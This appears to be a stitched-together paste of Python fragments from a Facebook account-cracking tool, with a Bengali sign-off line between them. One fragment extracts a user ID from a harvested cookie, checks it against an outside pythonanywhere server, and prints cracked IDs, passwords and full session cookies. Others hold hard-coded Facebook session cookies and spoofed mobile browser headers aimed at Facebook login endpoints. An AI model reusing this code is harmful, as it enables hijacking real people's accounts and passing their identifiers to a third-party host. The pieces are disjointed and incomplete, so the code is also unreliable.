                cix = coki.split('c_user')[1]
                cid = cix[0:15]
                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
                if 'LOCK' in res:
                    return 'LOCK'
                else:
                    print(f'  \r\033[1;92m  [TURAG-OK] '+uid+' • '+ps+'\33[0;92m')
                    print(f'  \r\033[1;92m  [COOKIE] '+coki)
OK BRO ASSAKAMUWALAIKUM KONO EKDIN DEKHA HOBE...


import requests

cookies = {
    'datr': 'MjfwZD81wgkcBUryU338kUr9',
    'sb': 'MjfwZLHGVSGLgO7hN8Z_laxE',
    'vpd': 'v1%3B804x424x1.5294095277786255',
    'wd': '471x530',
    'locale': 'en_US',
    'fr': '04mCTybeWYPnUiaqu.AWUEIX010FgZabRVqgRrs3hMG9s.Bk8Dcy.Zm.AAA.0.0.BlDsr3.AWVd5YBO48I',
}

headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-BD,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'cache-control': 'max-age=0',
    'dpr': '1.7000000476837158',
    'referer': 'https://mbasic.facebook.com/login/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"CPH2269"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}

response = requests.get('https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1', cookies=cookies, headers=headers)



{'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; 11; en-us; 10; T-Mobile myTouch 3G Slide Build/I373P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.9997.0.4355.61 Mobile Safari/533.1', 'Accept-Encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Connection': 'keep-alive', 'authority': 'x.facebook.com', 'method': 'GET', 'path': '/login/device-based/login/async/', 'scheme': 'https', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'dpr': '1.875', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"', 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-model': '"V2111"', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '"12.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'viewport-width': '980'}